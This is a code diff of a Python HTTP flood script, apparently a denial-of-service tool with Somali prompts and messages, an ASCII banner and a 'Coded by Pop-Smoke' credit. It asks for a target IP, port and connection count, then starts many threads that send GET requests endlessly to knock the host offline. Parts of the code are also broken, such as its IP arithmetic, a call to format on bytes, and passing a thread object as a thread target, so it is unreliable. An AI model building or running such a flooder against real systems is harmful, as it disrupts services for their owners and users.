@@ -1,56 +1,72 @@
-import requests
 import socket
-import sys
 from threading import Thread
+import os
+from termcolor import colored
+
+# Tirtir qoraalladii hore ee terminal-ka
+os.system('clear')
+
+# ASCII muuqaal xayawaan
+ascii_art = """
+   /\\_____/\\
+  /  o   o  \\
+ ( ==  ^  == )
+  )         (
+ (           )
+( (  )   (  ) )
+"""
+print(colored(ascii_art, 'red'))
+print(colored("Coded by Pop-Smoke\n", 'red'))
 
 class IPRange:
     def __init__(self, start, end):
-        [start, end] = [int(x) for x in [start, end]]
-        self.start = start
-        self.end = end
+        self.start = int(start.replace('.', ''))
+        self.end = int(end.replace('.', ''))
 
-        if start > end:
-            raise ValueError('Start IP greater than end IP')
+        if self.start > self.end:
+            raise ValueError('Start IP is greater than end IP')
 
-    def __contains__(self, ip):
-        ip = int(ip.replace('.', ''))
-        return self.start <= ip <= self.end
+    def __iter__(self):
+        self.current = self.start
+        return self
 
-TARGET_IP = '192.168.1.1'  # Replace with the desired target IP address
-TARGET_PORT = 80  # Replace with the desired target port
-MAX_CONNECTIONS = 100
-TARGET_IP_RANGE = IPRange(int(TARGET_IP.replace('.', '')), int(TARGET_IP.replace('.', ''))+255)
-print(f'[+] Target IP: {TARGET_IP}')
+    def __next__(self):
+        if self.current > self.end:
+            raise StopIteration
+        ip = self.current
+        self.current += 1
+        return '.'.join(str((ip >> (8 * i)) & 0xFF) for i in reversed(range(4)))
+
+# Codsashada IP iyo Port
+TARGET_IP = input(colored("Geli IP-ga bartilmaameedka (e.g., 192.168.1.1): ", 'yellow'))
+TARGET_PORT = int(input(colored("Geli Port-ka bartilmaameedka (e.g., 80): ", 'yellow')))
+MAX_CONNECTIONS = int(input(colored("Geli tirada isku xirnaanta (e.g., 100): ", 'yellow')))
+
+# IP Range-ka
+print(colored("[INFO] Xisaabinta IP-yada ku jira Range...", 'cyan'))
+TARGET_IP_RANGE = IPRange(TARGET_IP, f"{TARGET_IP[:-1]}255")
+
 class HTTPFlooder(Thread):
-    def __init__(self, start_ip, target_host, target_port):
+    def __init__(self, target_host, target_port):
         Thread.__init__(self)
-        self.start_ip = start_ip
-
         self.target_host = target_host
         self.target_port = target_port
+
     def run(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((self.target_host, self.target_port))
-
             while True:
-                s.sendall(b'GET / HTTP/1.1\r\n\r\n')
-                pass
-
+                s.sendall(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(self.target_host).encode())
         except Exception as e:
-            print(f'[-] Thread[{self.start_ip}] exited: {e}')
-
+            print(colored(f"[ERROR] Isku xirka wuu xirmay: {e}", 'red'))
         finally:
             s.close()
 
+# Bilaabista weerarka
+print(colored("[INFO] Weerarka wuxuu bilaabanayaa...", 'green'))
 for ip in TARGET_IP_RANGE:
-    try:
-        ip = '.'.join(str(x) for x in [int(TARGET_IP[i])+int(i==1)*int(j<i) for i in range(4)] if i > 0)
+    for _ in range(MAX_CONNECTIONS):
+        Thread(target=HTTPFlooder(TARGET_IP, TARGET_PORT)).start()
 
-        if ip in TARGET_IP_RANGE:
-            print(f'[+] Flooding IP: {ip}')
-            for _ in range(MAX_CONNECTIONS):
-                Thread(target=HTTPFlooder(ip, TARGET_HOST, TARGET_PORT + 2)).start()
-
-    except Exception as e:
-        continue
+print(colored("[INFO] Weerarka wuu socda hadda.", 'green'))
